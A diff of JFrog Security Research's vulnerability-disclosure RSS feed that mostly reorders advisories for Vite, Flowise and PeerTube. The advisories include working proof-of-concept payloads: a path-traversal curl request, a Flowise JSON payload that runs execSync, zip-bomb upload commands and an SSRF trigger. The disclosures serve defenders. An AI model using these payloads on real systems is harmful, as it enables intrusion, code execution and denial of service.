@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Fri, 17 Jul 2026 00:41:19 GMT</lastBuildDate>
+        <lastBuildDate>Sat, 18 Jul 2026 00:38:00 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -1316,54 +1316,6 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Vite arbitrary remote HTML file leak
-
-## Component
-
-[vite](https://www.npmjs.com/package/vite)
-
-## Affected versions
-
-\>=7.1.0,<=7.1.4
-
-\>=7.0.0,<=7.0.6
-
-\>=6.0.0,<=6.3.5
-
-<=5.4.19
-
-## Description
-
-This vulnerability allows a remote attacker to leak any HTML file on the system.
-
-## PoC
-
-Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
-
-```shell
-curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this vulnerability 
-
-
-
-## References
-
-[Fix PR](https://github.com/vitejs/vite/pull/20736)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Vite arbitrary restricted remote file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-private-file-leak/</link>
             <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-private-file-leak/</guid>
@@ -1432,6 +1384,54 @@ No mitigations are supplied for this vulnerability
 ## References
 
 [Fix PR](https://github.com/vitejs/vite/pull/20735)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Vite arbitrary remote HTML file leak
+
+## Component
+
+[vite](https://www.npmjs.com/package/vite)
+
+## Affected versions
+
+\>=7.1.0,<=7.1.4
+
+\>=7.0.0,<=7.0.6
+
+\>=6.0.0,<=6.3.5
+
+<=5.4.19
+
+## Description
+
+This vulnerability allows a remote attacker to leak any HTML file on the system.
+
+## PoC
+
+Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
+
+```shell
+curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this vulnerability 
+
+
+
+## References
+
+[Fix PR](https://github.com/vitejs/vite/pull/20736)
 ]]></content:encoded>
         </item>
         <item>
@@ -1517,6 +1517,60 @@ additional_authorized_imports=[],executor_type='wasm')
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Flowise JS injection remote code execution]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
+            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Unintended dynamic code execution leads to remote code execution by network attackers
+
+## Component
+
+[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
+
+## Affected versions
+
+(,)
+
+## Description
+
+User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
+
+
+## PoC
+
+Send the following payload to the `node-load-method/customMCP` API endpoint -
+
+```json
+{
+    "inputs":
+    {
+        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
+    },
+    "loadMethod": "listActions"
+}
+```
+
+
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Flowise OS command remote code execution]]></title>
             <link>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</link>
             <guid>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</guid>
@@ -1565,60 +1619,6 @@ Send the following payload to the `node-load-method/customMCP` API endpoint -
 ## Vulnerability Mitigations
 
 No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Flowise JS injection remote code execution]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
-            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Unintended dynamic code execution leads to remote code execution by network attackers
-
-## Component
-
-[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
-
-## Affected versions
-
-(,)
-
-## Description
-
-User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
-
-
-## PoC
-
-Send the following payload to the `node-load-method/customMCP` API endpoint -
-
-```json
-{
-    "inputs":
-    {
-        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
-    },
-    "loadMethod": "listActions"
-}
-```
-
-
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
 
 ## References
 
@@ -2036,72 +2036,6 @@ It is recommended to switch to this maintained library if possible.
 [Original advisory](https://github.com/mholt/archives/issues/27)]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32948 High severity. PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any attacker to cause the server to stop functioning, or in special cases send requests to arbitrary URLs (Blind SSRF).
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. Part of the parsing of playlist ActivityPub objects includes fetching the playlist elements. The function that gets the list of the playlist items to fetch is **fetchElementUrls**. It is called from **createOrUpdateVideoPlaylist**. Afterwards, the **rebuildVideoPlaylistElements** function is called, which in turn calls the **buildElementsDBAttributes**, that calls **fetchRemotePlaylistElement** for each element. If the activity has an object instead of a string in the **url** field, the object will eventually be passed into the **got** library that is used by PeerTube, and will be parsed as additional options for the fetch. If the object will have valid options, they will be used by the **got** libraries. Such an example could be **{“enableUnixSockets”: true, “url”: “unix:/….”}**, which will cause the library to fetch from a UNIX socket (which won’t be protected by the **got-ssrf** library). Also the HTTP method can be changed, and some other options. In the case that the key isn’t valid, an error will be thrown, and will later be thrown again by the **_destroy** function in **got**, and will not be caught, causing the server to crash.
-
-It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
-
-
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
-
-1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
-
-   ```
-   python malicious_rest_server.py
-   ```
-
-   This will start a server listening on port 1234.
-
-1. In another terminal, run the following command (insert the user token in the proper place):
-
-   ```
-   curl -v 'http://localhost:3000/api/v1/search/video-channels?search=http://localhost:1234/accounts/root_crash' -H 'Authorization: Bearer user_token'
-   ```
-
-   This technique is based on PeerTube’s search for channels. After fetching the outbox of a user, it will not be possible to ask for the same user again using this technique until the refresh interval will pass. This means that every time you want to run this curl command you should change something in the username (for example `http://localhost:1234/accounts/root1_crash` instead of `http://localhost:1234/accounts/root_crash`) .
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PeerTube ActivityPub Crawl Infinite Loop DoS]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-crawl-dos/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-crawl-dos/</guid>
@@ -2183,6 +2117,72 @@ This PoC assumes that there is a PeerTube instance on the machine listening on p
    This script will create, sign and send a Create Activity to **http://localhost:9000/inbox**.
 
 1. If everything was configured correctly, the PeerTube server won’t function normally anymore.
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32948 High severity. PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any attacker to cause the server to stop functioning, or in special cases send requests to arbitrary URLs (Blind SSRF).
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. Part of the parsing of playlist ActivityPub objects includes fetching the playlist elements. The function that gets the list of the playlist items to fetch is **fetchElementUrls**. It is called from **createOrUpdateVideoPlaylist**. Afterwards, the **rebuildVideoPlaylistElements** function is called, which in turn calls the **buildElementsDBAttributes**, that calls **fetchRemotePlaylistElement** for each element. If the activity has an object instead of a string in the **url** field, the object will eventually be passed into the **got** library that is used by PeerTube, and will be parsed as additional options for the fetch. If the object will have valid options, they will be used by the **got** libraries. Such an example could be **{“enableUnixSockets”: true, “url”: “unix:/….”}**, which will cause the library to fetch from a UNIX socket (which won’t be protected by the **got-ssrf** library). Also the HTTP method can be changed, and some other options. In the case that the key isn’t valid, an error will be thrown, and will later be thrown again by the **_destroy** function in **got**, and will not be caught, causing the server to crash.
+
+It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
+
+
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
+
+1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
+
+   ```
+   python malicious_rest_server.py
+   ```
+
+   This will start a server listening on port 1234.
+
+1. In another terminal, run the following command (insert the user token in the proper place):
+
+   ```
+   curl -v 'http://localhost:3000/api/v1/search/video-channels?search=http://localhost:1234/accounts/root_crash' -H 'Authorization: Bearer user_token'
+   ```
+
+   This technique is based on PeerTube’s search for channels. After fetching the outbox of a user, it will not be possible to ask for the same user again using this technique until the refresh interval will pass. This means that every time you want to run this curl command you should change something in the username (for example `http://localhost:1234/accounts/root1_crash` instead of `http://localhost:1234/accounts/root_crash`) .
 
 ## Vulnerability Mitigations
 
@@ -2285,91 +2285,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube Arbitrary Playlist Creation via REST API]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32945 Medium severity. PeerTube Arbitrary Playlist Creation via REST API]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows an existing user to add playlists to a different user’s channel using the REST API.
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-The server listens for POST requests to the **/api/v1/video-playlists** path. This path is used for adding a playlist to the PeerTube instance. The **createVideoPlaylist** function receives the request parameters and is in charge of creating the playlist. The following code sets all the parameters of the playlist:
-
-```js
-const videoPlaylist = new VideoPlaylistModel({
-    name: videoPlaylistInfo.displayName,
-    description: videoPlaylistInfo.description,
-    privacy: videoPlaylistInfo.privacy || VideoPlaylistPrivacy.PRIVATE,
-    ownerAccountId: user.Account.id
-}) as MVideoPlaylistFull
-
-videoPlaylist.url = getLocalVideoPlaylistActivityPubUrl(videoPlaylist) // We use the UUID, so set the URL after building the object
-
-if (videoPlaylistInfo.videoChannelId) {
-  const videoChannel = res.locals.videoChannel
-
-  videoPlaylist.videoChannelId = videoChannel.id
-  videoPlaylist.VideoChannel = videoChannel
-}
-
-```
-
-This code sets the owner of the new playlist to be the user who performed the request, and then sets the associated channel to the channel ID supplied by the request, without checking if it belongs to the user. This will allow any user to create a playlist in any existing channel on the server. The playlist will be owned by the attacking user, thus only the attacking user will be able to add and remove videos or change the properties of the playlist, while it will be listed in the web interface as belonging to a different user’s channel.
-
-
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
-
-1. Browse to [**http://localhost:3000/api/v1/video-channels**](http://localhost:3000/api/v1/video-channels) and find a video-channel to attack. If there is none, add one to the root user using the web interface. The ID number of the channel will be needed for the next step.
-
-1. Run the following command (insert the user token and channel ID in the proper places):
-
-   ```
-   curl 'http://localhost:3000/api/v1/video-playlists' -H 'Authorization: Bearer user_token' -F "displayName=playlist" -F "videoChannelId=channel_id" -F "privacy=1"
-   ```
-
-   
-
-1. Browse to [**http://localhost:3000/api/v1/video-playlists**](http://localhost:3000/api/v1/video-playlists). The new playlist will be listed there with the attacking user listed as the owner and the attacked channel listed as the playlist’s channel.
-
-1. Using the web interface it will be possible to see the playlist listed in the attacked channel. The attacked user will not see it listed in the “My Library” page, nor will they be able to add or remove videos from it. The attacking user will see it listed under the “My Library” page, and will be able to add or remove videos to it.
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PeerTube User Import Authenticated Persistent Denial of Service]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</guid>
@@ -2413,6 +2328,64 @@ new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/i
 curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
 ```
 If everything was done correctly, the PeerTube server will crash, and will keep crashing as long as the ZIP file is not deleted from the system.
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PeerTube User Import Authenticated Resource Exhaustion]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32949 Medium severity. PeerTube User Import Authenticated Resource Exhaustion]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any authenticated user to cause the server to consume very large amounts of disk space when extracting a Zip Bomb
+
+
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
+The yauzl library does not contain any mechanism to detect or prevent extraction of a [Zip Bomb](https://en.wikipedia.org/wiki/Zip_bomb). Therefore, when using the User Import functionality with a Zip Bomb, PeerTube will try extracting the archive which will cause a disk space resource exhaustion.
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
+1. Create a Zip Bomb named `evil.zip` in the current directory
+1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
+```
+new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
+curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
+```
+If everything was done correctly, the PeerTube server will begin extracting the zip file, which will cause disk space resource exhaustion.
 
 
 
@@ -2486,15 +2459,13 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube User Import Authenticated Resource Exhaustion]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</guid>
+            <title><![CDATA[PeerTube Arbitrary Playlist Creation via REST API]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</guid>
             <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32949 Medium severity. PeerTube User Import Authenticated Resource Exhaustion]]></description>
+            <description><![CDATA[CVE-2025-32945 Medium severity. PeerTube Arbitrary Playlist Creation via REST API]]></description>
             <content:encoded><![CDATA[## Summary
-This vulnerability allows any authenticated user to cause the server to consume very large amounts of disk space when extracting a Zip Bomb
-
-
+This vulnerability allows an existing user to add playlists to a different user’s channel using the REST API.
 
 ## Component
 
@@ -2510,23 +2481,52 @@ This vulnerability allows any authenticated user to cause the server to consume 
 
 ## Description
 
-If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
-The yauzl library does not contain any mechanism to detect or prevent extraction of a [Zip Bomb](https://en.wikipedia.org/wiki/Zip_bomb). Therefore, when using the User Import functionality with a Zip Bomb, PeerTube will try extracting the archive which will cause a disk space resource exhaustion.
+The server listens for POST requests to the **/api/v1/video-playlists** path. This path is used for adding a playlist to the PeerTube instance. The **createVideoPlaylist** function receives the request parameters and is in charge of creating the playlist. The following code sets all the parameters of the playlist:
+
+```js
+const videoPlaylist = new VideoPlaylistModel({
+    name: videoPlaylistInfo.displayName,
+    description: videoPlaylistInfo.description,
+    privacy: videoPlaylistInfo.privacy || VideoPlaylistPrivacy.PRIVATE,
+    ownerAccountId: user.Account.id
+}) as MVideoPlaylistFull
+
+videoPlaylist.url = getLocalVideoPlaylistActivityPubUrl(videoPlaylist) // We use the UUID, so set the URL after building the object
+
+if (videoPlaylistInfo.videoChannelId) {
+  const videoChannel = res.locals.videoChannel
+
+  videoPlaylist.videoChannelId = videoChannel.id
+  videoPlaylist.VideoChannel = videoChannel
+}
+
+```
+
+This code sets the owner of the new playlist to be the user who performed the request, and then sets the associated channel to the channel ID supplied by the request, without checking if it belongs to the user. This will allow any user to create a playlist in any existing channel on the server. The playlist will be owned by the attacking user, thus only the attacking user will be able to add and remove videos or change the properties of the playlist, while it will be listed in the web interface as belonging to a different user’s channel.
+
+
 
 ## PoC
 
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
 
 
 
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
-1. Create a Zip Bomb named `evil.zip` in the current directory
-1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
-```
-new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
-curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
-```
-If everything was done correctly, the PeerTube server will begin extracting the zip file, which will cause disk space resource exhaustion.
+1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
+
+1. Browse to [**http://localhost:3000/api/v1/video-channels**](http://localhost:3000/api/v1/video-channels) and find a video-channel to attack. If there is none, add one to the root user using the web interface. The ID number of the channel will be needed for the next step.
+
+1. Run the following command (insert the user token and channel ID in the proper places):
+
+   ```
+   curl 'http://localhost:3000/api/v1/video-playlists' -H 'Authorization: Bearer user_token' -F "displayName=playlist" -F "videoChannelId=channel_id" -F "privacy=1"
+   ```
+
+   
+
+1. Browse to [**http://localhost:3000/api/v1/video-playlists**](http://localhost:3000/api/v1/video-playlists). The new playlist will be listed there with the attacking user listed as the owner and the attacked channel listed as the playlist’s channel.
+
+1. Using the web interface it will be possible to see the playlist listed in the attacked channel. The attacked user will not see it listed in the “My Library” page, nor will they be able to add or remove videos from it. The attacking user will see it listed under the “My Library” page, and will be able to add or remove videos to it.
 
 
 
